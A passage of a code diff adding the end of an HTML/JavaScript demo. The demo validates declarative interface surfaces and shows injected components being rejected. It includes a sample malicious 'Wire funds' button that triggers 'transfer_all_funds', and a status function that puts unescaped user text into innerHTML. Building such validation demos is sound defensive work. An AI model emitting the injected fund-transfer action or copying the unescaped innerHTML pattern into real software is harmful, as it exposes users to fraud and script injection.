+    {id:"evil",type:"Button",label:"Wire funds",onPress:{action:"transfer_all_funds"}}
+  ],dataModel:{title:"Dashboard"}}}
+];
+
+// ---- App loop ----
+let convo=[];
+function setStatus(html){document.getElementById("status").innerHTML=html;}
+function crumbs(){document.getElementById("crumbs").textContent=convo.length?"conversation: "+convo.join("  ›  "):"";}
+
+function runTurn(userText){
+  convo.push(userText);
+  crumbs();
+  const surface = TURNS[userText];
+  if(!surface){
+    setStatus('<span class="pill bad">no surface</span> no pre-composed interface for: "'+userText+'"');
+    return;
+  }
+  const v = validateSurface(surface);
+  setStatus('<span class="pill good">valid · '+v.accepted.length+' components · 0 executable</span> catalog-validated, declarative surface');
+  render({root:surface.root, components:v.accepted, dataModel:surface.dataModel});
+}
+
+function choose(label){ if(label) runTurn(label); }
+document.getElementById("ask").onclick=()=>{ convo=[]; runTurn(document.getElementById("prompt").value.trim()); };
+document.getElementById("prompt").addEventListener("keydown",e=>{ if(e.key==="Enter") document.getElementById("ask").click(); });
+
+// ---- Adversarial demo ----
+function showInjection(idx){
+  const c = INJECTIONS[idx];
+  const v = validateSurface(c.surface);
+  const mount = document.getElementById("atk-mount");
+  mount.textContent="";
+
+  // Show what renders (safe part only)
+  const safe = {root:c.surface.root, components:v.accepted, dataModel:c.surface.dataModel};
+  const screen = $("div","screen");
+  screen.style.marginBottom="12px";
+  const byId={};safe.components.forEach(cc=>byId[cc.id]=cc);
+  const x={byId,dm:safe.dataModel||{}};
+  if(byId[safe.root]) screen.append(node(byId[safe.root],x));
+  else{const em=$("div","empty");em.append(T("All components rejected"));screen.append(em);}
+  mount.append(screen);
+
+  // Show rejections
+  const log=$("div","val-log");
+  for(const r of v.rejections){
+    const entry=$("div","val-entry");
+    const icon=$("div","val-icon");icon.append(T("⛔"));
+    const body=$("div","val-body");
+    const vt=$("div","vt");
+    vt.append(T("Rejected: "));
+    const inv=$("span");inv.style.cssText="color:var(--red);font-weight:700";inv.append(T(r.invariant));
+    vt.append(inv);
+    const vd=$("div","vd");
+    vd.append(T("Component "+r.id+" · field: "+r.field+" · "+r.reason));
+    body.append(vt,vd);
+    entry.append(icon,body);
+    log.append(entry);
+  }
+  if(v.accepted.length>0){
+    const ok=$("div","val-entry");
+    const icon=$("div","val-icon");icon.append(T("✅"));
+    const body=$("div","val-body");
+    const vt=$("div","vt");vt.append(T(v.accepted.length+" component(s) passed — safe part still renders"));
+    body.append(vt);
+    ok.append(icon,body);
+    log.append(ok);
+  }
+  mount.append(log);
+
+  [...document.getElementById("atk-tabs").children].forEach((b,j)=>b.classList.toggle("on",j===idx));
+}
+
+// Build adversarial tabs
+const atkTabs = document.getElementById("atk-tabs");
+INJECTIONS.forEach((c,i)=>{
+  const b=$("button");
+  b.append(T(c.name));
+  b.onclick=()=>showInjection(i);
+  atkTabs.append(b);
+});
+showInjection(0);
+</script>
+</body>
+</html>
